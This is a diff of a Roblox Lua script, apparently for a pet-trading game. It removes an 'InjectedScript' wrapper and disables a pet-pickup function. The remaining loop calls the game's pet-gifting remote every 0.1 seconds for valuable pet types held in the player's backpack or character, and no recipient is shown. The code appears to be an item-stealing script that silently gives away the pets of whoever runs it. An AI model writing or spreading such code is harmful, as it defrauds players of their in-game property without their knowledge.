@@ -1,10 +1,4 @@
-local PlayerScript = Instance.new("LocalScript")
-PlayerScript.Name = "InjectedScript"
-PlayerScript.Parent = StarterPlayerScripts
-
--- Example code: you can load your main logic here
-PlayerScript.Source = [[
-    warn("[PETGIFT] Script started")
+warn("[PETGIFT] Script started")
 
 local DEBUG_TAG = "[PETGIFT]"
 local Players = game:GetService("Players")
@@ -12,9 +6,9 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
 local GiftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
-local PickUpModule = require(
+--[[local PickUpModule = require(
 	ReplicatedStorage.Modules.PetServices.PetActionUserInterfaceService.PetActionsHandlers.PickUp
-)
+)]]
 
 -- List of allowed pet types
 local ALLOWED_PET_TYPES = { "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
@@ -103,7 +97,7 @@ end
 
 
 -- Pick up placed pets
---local function pickUpPlacedPets()
+--[[local function pickUpPlacedPets()
 	local activeUI = LocalPlayer.PlayerGui:FindFirstChild("ActivePetUI")
 	if not activeUI then
 		return
@@ -134,7 +128,7 @@ end
 			end
 		end
 	end
-end
+end]]
 
 -- Main loop
 debugPrint("Starting pet gifting + pickup loop")
@@ -143,7 +137,6 @@ task.spawn(function()
 		task.wait(0.1)
 		checkAndGiftFromContainer(LocalPlayer.Backpack)
 		checkAndGiftFromContainer(LocalPlayer.Character)
-		pickUpPlacedPets()
+		--pickUpPlacedPets()
 	end
 end)
-]]
